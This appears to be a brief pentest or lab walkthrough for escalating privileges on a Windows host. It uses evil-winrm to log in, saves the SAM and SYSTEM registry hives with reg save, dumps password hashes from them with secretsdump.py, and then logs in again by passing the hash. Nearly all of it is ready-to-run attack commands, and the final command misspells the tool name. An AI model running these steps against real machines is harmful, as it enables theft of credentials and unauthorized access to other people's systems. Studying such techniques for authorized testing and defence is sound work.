Login with evil-winrm

```Shell
evil-winrm -i x.x.x.x -u <username> -p <password> 
```

Check for privileges.

```PowerShell
whoami /groups
```

Let's get the important registry hives.

```PowerShell
reg save hklm\system system.bak
reg save hklm\sam sam.bak
```

lets get the hashes.

```Shell
python3 secretsdump.py -sam sam.bak -system system.bak LOCAL
```

Get the hash and copy it.
Use evil-winrm to login using the hash.

```Shell
evil-wimrm -i x.x.x.x -u <username> -H <hash> 
```

